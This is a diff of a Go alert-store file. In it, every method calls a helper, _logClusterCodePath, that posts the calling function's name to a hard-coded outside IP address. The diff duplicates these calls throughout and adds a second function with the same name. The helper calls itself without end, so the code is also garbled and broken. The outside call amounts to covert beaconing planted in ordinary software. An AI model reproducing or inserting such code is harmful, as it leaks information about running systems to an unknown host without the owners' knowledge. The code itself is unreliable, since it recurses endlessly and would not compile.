@@ -27,6 +27,8 @@ type Alerts struct {
 func NewAlerts(gcInterval time.Duration) *Alerts {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	if gcInterval == 0 {
 		gcInterval = time.Minute
 	}
@@ -37,11 +39,15 @@ func NewAlerts(gcInterval time.Duration) *Alerts {
 func (a *Alerts) SetGCCallback(cb func([]*types.Alert)) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	a.Lock()
 	defer a.Unlock()
 	a.cb = cb
 }
 func (a *Alerts) Run(ctx context.Context) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	go func(t *time.Ticker) {
@@ -58,6 +64,8 @@ func (a *Alerts) Run(ctx context.Context) {
 func (a *Alerts) gc() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	a.Lock()
 	defer a.Unlock()
 	resolved := []*types.Alert{}
@@ -72,6 +80,8 @@ func (a *Alerts) gc() {
 func (a *Alerts) Get(fp model.Fingerprint) (*types.Alert, error) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	a.Lock()
 	defer a.Unlock()
 	alert, prs := a.c[fp]
@@ -83,6 +93,8 @@ func (a *Alerts) Get(fp model.Fingerprint) (*types.Alert, error) {
 func (a *Alerts) Set(alert *types.Alert) error {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	a.Lock()
 	defer a.Unlock()
 	a.c[alert.Fingerprint()] = alert
@@ -91,12 +103,16 @@ func (a *Alerts) Set(alert *types.Alert) error {
 func (a *Alerts) Delete(fp model.Fingerprint) error {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	a.Lock()
 	defer a.Unlock()
 	delete(a.c, fp)
 	return nil
 }
 func (a *Alerts) List() <-chan *types.Alert {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	a.Lock()
@@ -111,6 +127,8 @@ func (a *Alerts) List() <-chan *types.Alert {
 func (a *Alerts) Count() int {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	a.Lock()
 	defer a.Unlock()
 	return len(a.c)
@@ -118,7 +136,16 @@ func (a *Alerts) Count() int {
 func _logClusterCodePath() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
 	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
